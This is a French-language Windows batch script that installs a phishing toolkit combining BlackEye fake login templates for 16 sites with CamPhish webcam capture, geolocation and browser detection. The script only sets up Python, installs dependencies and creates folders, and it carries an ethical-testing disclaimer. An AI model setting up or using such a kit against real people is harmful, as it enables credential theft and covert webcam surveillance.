@echo off
echo 🎣 Installation de Phishing Tool Pro v2.0 (BlackEye + CamPhish Enhanced)
echo ==================================================

REM Vérifier Python
python --version >nul 2>&1
if errorlevel 1 (
    echo ❌ Python n'est pas installé. Veuillez l'installer d'abord.
    echo Téléchargez Python depuis: https://www.python.org/downloads/
    pause
    exit /b 1
)

echo ✅ Python détecté

REM Créer l'environnement virtuel
echo 🔧 Création de l'environnement virtuel...
python -m venv venv
if errorlevel 1 (
    echo ❌ Échec de la création de l'environnement virtuel
    pause
    exit /b 1
)

REM Activer l'environnement virtuel
echo 🔧 Activation de l'environnement virtuel...
call venv\Scripts\activate.bat

REM Installer les dépendances
echo 📦 Installation des dépendances...
python -m pip install --upgrade pip
pip install -r requirements.txt
if errorlevel 1 (
    echo ❌ Échec de l'installation des dépendances
    pause
    exit /b 1
)

REM Créer les dossiers nécessaires
echo 📁 Création des dossiers...
if not exist "templates" mkdir templates
if not exist "captures" mkdir captures
if not exist "logs" mkdir logs

echo ✅ Installation terminée!
echo.
echo 🚀 Pour lancer l'outil:
echo    run.bat
echo    ou
echo    python phishing_tool.py
echo.
echo 🎯 Fonctionnalités disponibles:
echo    - Templates BlackEye (16 sites)
echo    - Capture webcam (CamPhish)
echo    - Géolocalisation avancée
echo    - Détection navigateur/OS
echo    - Interface moderne
echo.
echo ⚠️  ATTENTION: Utilisez uniquement pour des tests éthiques!
pause 